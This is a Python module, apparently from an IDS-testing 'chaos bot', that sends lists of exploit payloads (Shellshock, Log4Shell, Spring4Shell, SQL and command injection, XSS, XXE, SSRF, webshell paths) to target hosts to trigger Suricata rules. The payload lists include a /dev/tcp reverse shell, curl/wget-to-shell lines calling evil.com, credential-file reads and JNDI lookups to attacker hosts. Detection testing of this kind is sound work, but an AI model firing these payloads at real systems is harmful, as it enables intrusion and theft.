"""Exploit spray module — sends CVE payloads that trigger Suricata/ET Open rules."""

import random
import time
import requests
from requests.adapters import HTTPAdapter

from chaos_bot.modules.base import BaseModule


class SourceIPAdapter(HTTPAdapter):
    """HTTPAdapter that binds to a specific source IP."""

    def __init__(self, source_address: str, **kwargs):
        self._source_address = source_address
        super().__init__(**kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs["source_address"] = (self._source_address, 0)
        super().init_poolmanager(*args, **kwargs)


# ============================================================================
# EXPLOIT PAYLOADS - Designed to trigger ET Open Suricata rules
# ============================================================================

# CVE-2014-6271 Shellshock - triggers ET WEB_SERVER rules
SHELLSHOCK_PAYLOADS = [
    "() { :; }; /bin/bash -c 'cat /etc/passwd'",
    "() { :;}; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "() { :; }; echo vulnerable",
    "() { :;}; /usr/bin/id",
    "() { ignored; }; /bin/bash -c 'wget http://evil.com/shell.sh'",
]

# CVE-2021-44228 Log4Shell - triggers ET EXPLOIT rules
LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://attacker.com/a}",
    "${jndi:rmi://evil.com:1099/Object}",
    "${jndi:ldap://${env:USER}.attacker.com/a}",
    "${jndi:dns://evil.com/a}",
    "${${lower:j}ndi:${lower:l}dap://x.x.x.x/a}",
    "${jndi:ldap://127.0.0.1#.evil.com:1389/a}",
]

# CVE-2022-22965 Spring4Shell - triggers ET EXPLOIT rules
SPRING4SHELL_PAYLOADS = [
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
    "class.module.classLoader.DefaultAssertionStatus=true",
]

# Command injection - triggers ET WEB_SERVER rules
CMD_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| id",
    "`id`",
    "$(cat /etc/shadow)",
    "; wget http://evil.com/shell.sh; bash shell.sh",
    "|| ping -c 3 evil.com",
    "& net user",
    "; curl http://evil.com/backdoor.sh | sh",
]

# SQL injection - triggers ET WEB_SERVER/WEB_SPECIFIC rules
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT username,password FROM users--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; EXEC xp_cmdshell('whoami');--",
    "' OR 'x'='x",
    "admin'--",
    "1; DROP TABLE users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "-1 OR 17-7=10",
]

# XSS payloads - triggers ET WEB rules
XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
]

# Path traversal - triggers ET WEB_SERVER rules
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd%00.jpg",
    "....\\....\\....\\windows\\system32\\config\\sam",
]

# PHP injection - triggers ET WEB_SERVER rules
PHP_INJECTION_PAYLOADS = [
    "<?php system(['cmd']); ?>",
    "<?php eval(base64_decode(['x'])); ?>",
    "<?php passthru('id'); ?>",
]

# Known malware user-agents - triggers ET MALWARE rules
MALWARE_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "masscan/1.3",
    "sqlmap/1.7#stable",
    "nikto/2.5.0",
    "gobuster/3.6",
    "ZmEu",  # ZmEu scanner
    "Morfeus Fucking Scanner",
    "Toata dragridge)",
    "DirBuster-1.0-RC1",
]

# Webshell access patterns - triggers ET WEB_SERVER rules
WEBSHELL_PATHS = [
    "/c99.php",
    "/r57.php",
    "/shell.php",
    "/cmd.php?cmd=id",
    "/backdoor.php",
    "/webshell.php",
    "/b374k.php",
    "/wso.php",
    "/alfa.php",
    "/adminer.php",
]

# Apache Struts RCE patterns - triggers ET EXPLOIT rules
STRUTS_PAYLOADS = [
    "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
    "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}",
]

# Server-Side Request Forgery patterns
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://127.0.0.1:22/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
]

# XML External Entity patterns - triggers ET WEB rules
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
]

# Protocol smuggling/confusion
PROTOCOL_PAYLOADS = [
    "CONNECT evil.com:443 HTTP/1.1",
    "GET http://internal-server/ HTTP/1.1",
]


class ExploitSpray(BaseModule):
    """Spray exploit payloads to trigger IDS alerts."""

    def run(self, targets: list[str]) -> dict:
        mod_cfg = self.config.get("modules", {}).get("exploit_spray", {})
        intensity = mod_cfg.get("intensity", "medium")
        
        # Number of payloads per category based on intensity
        payload_counts = {
            "low": 1,
            "medium": 3,
            "high": 5,
        }
        count = payload_counts.get(intensity, 3)
        
        session = requests.Session()
        if self.source_ip and self.source_ip != "0.0.0.0":
            adapter = SourceIPAdapter(self.source_ip)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
        
        requests.packages.urllib3.disable_warnings()
        
        shuffled = self._expand_targets(targets, sample_size=10)
        random.shuffle(shuffled)
        results = []
        
        for target in shuffled:
            base_url = f"http://{target}"
            
            # Build all exploit probes
            probes = self._build_exploit_probes(base_url, count)
            random.shuffle(probes)
            
            for probe in probes:
                self.log.info(
                    f"Exploit spray: {probe['type']} → {target}",
                    extra={"bot_module": "exploit_spray", "target_ip": target,
                           "source_ip": self.source_ip, "exploit_type": probe['type']},
                )
                
                if self.dry_run:
                    results.append({
                        "target": target,
                        "exploit_type": probe["type"],
                        "status": "dry-run",
                    })
                    continue
                
                try:
                    result = self._send_exploit(session, probe, target)
                    results.append(result)
                    
                    if self.metrics:
                        self.metrics.http_probes_total.labels(
                            probe_type=f"exploit_{probe['type']}"
                        ).inc()
                except Exception as e:
                    self.log.debug(f"Probe failed (expected): {e}")
                    results.append({
                        "target": target,
                        "exploit_type": probe["type"],
                        "status": "sent",  # We still sent it, just got error back
                    })
                
                # Jitter between probes
                time.sleep(random.uniform(0.2, 1.5))
            
            # Jitter between targets
            time.sleep(random.uniform(1.0, 3.0))
        
        return {
            "status": "complete",
            "summary": f"Sprayed {len(results)} exploits across {len(shuffled)} targets",
            "details": results,
        }
    
    def _build_exploit_probes(self, base_url: str, count: int) -> list[dict]:
        """Build exploit probe requests."""
        probes = []
        
        # Shellshock in various headers
        for payload in random.sample(SHELLSHOCK_PAYLOADS, min(count, len(SHELLSHOCK_PAYLOADS))):
            probes.append({
                "type": "shellshock",
                "url": base_url + "/cgi-bin/test.cgi",
                "method": "GET",
                "headers": {"User-Agent": payload, "Referer": payload},
            })
        
        # Log4Shell in various places
        for payload in random.sample(LOG4SHELL_PAYLOADS, min(count, len(LOG4SHELL_PAYLOADS))):
            probes.append({
                "type": "log4shell",
                "url": base_url + "/",
                "method": "GET",
                "headers": {
                    "User-Agent": payload,
                    "X-Forwarded-For": payload,
                    "X-Api-Version": payload,
                },
            })
            # Also in URL params
            probes.append({
                "type": "log4shell",
                "url": base_url + f"/?search={payload}",
                "method": "GET",
                "headers": {},
            })
        
        # Command injection
        for payload in random.sample(CMD_INJECTION_PAYLOADS, min(count, len(CMD_INJECTION_PAYLOADS))):
            probes.append({
                "type": "cmd_injection",
                "url": base_url + f"/?cmd={payload}",
                "method": "GET",
                "headers": {},
            })
        
        # SQL injection
        for payload in random.sample(SQLI_PAYLOADS, min(count, len(SQLI_PAYLOADS))):
            probes.append({
                "type": "sqli",
                "url": base_url + f"/?id={payload}&user={payload}",
                "method": "GET",
                "headers": {},
            })
        
        # Path traversal
        for payload in random.sample(PATH_TRAVERSAL_PAYLOADS, min(count, len(PATH_TRAVERSAL_PAYLOADS))):
            probes.append({
                "type": "path_traversal",
                "url": base_url + f"/{payload}",
                "method": "GET",
                "headers": {},
            })
            probes.append({
                "type": "path_traversal",
                "url": base_url + f"/?file={payload}",
                "method": "GET",
                "headers": {},
            })
        
        # XSS
        for payload in random.sample(XSS_PAYLOADS, min(count, len(XSS_PAYLOADS))):
            probes.append({
                "type": "xss",
                "url": base_url + f"/?q={payload}",
                "method": "GET",
                "headers": {},
            })
        
        # Webshell paths
        for path in random.sample(WEBSHELL_PATHS, min(count, len(WEBSHELL_PATHS))):
            probes.append({
                "type": "webshell",
                "url": base_url + path,
                "method": "GET",
                "headers": {},
            })
        
        # Malware user-agents
        for ua in random.sample(MALWARE_USER_AGENTS, min(count, len(MALWARE_USER_AGENTS))):
            probes.append({
                "type": "malware_ua",
                "url": base_url + "/",
                "method": "GET",
                "headers": {"User-Agent": ua},
            })
        
        # SSRF attempts
        for payload in random.sample(SSRF_PAYLOADS, min(count, len(SSRF_PAYLOADS))):
            probes.append({
                "type": "ssrf",
                "url": base_url + f"/?url={payload}",
                "method": "GET",
                "headers": {},
            })
        
        # Spring4Shell
        for payload in SPRING4SHELL_PAYLOADS[:count]:
            probes.append({
                "type": "spring4shell",
                "url": base_url + f"/?{payload}",
                "method": "GET",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            })
        
        # PHP injection (POST)
        for payload in random.sample(PHP_INJECTION_PAYLOADS, min(count, len(PHP_INJECTION_PAYLOADS))):
            probes.append({
                "type": "php_injection",
                "url": base_url + "/upload.php",
                "method": "POST",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": f"code={payload}",
            })
        
        # XXE (POST with XML)
        for payload in XXE_PAYLOADS[:count]:
            probes.append({
                "type": "xxe",
                "url": base_url + "/api/parse",
                "method": "POST",
                "headers": {"Content-Type": "application/xml"},
                "data": payload,
            })
        
        return probes
    
    def _send_exploit(self, session: requests.Session, probe: dict, target: str) -> dict:
        """Send a single exploit probe."""
        try:
            resp = session.request(
                method=probe.get("method", "GET"),
                url=probe["url"],
                headers=probe.get("headers", {}),
                data=probe.get("data"),
                timeout=5,
                verify=False,
                allow_redirects=False,
            )
            return {
                "target": target,
                "exploit_type": probe["type"],
                "status_code": resp.status_code,
                "status": "complete",
            }
        except requests.RequestException as e:
            return {
                "target": target,
                "exploit_type": probe["type"],
                "status": "sent",
                "error": str(e)[:50],
            }
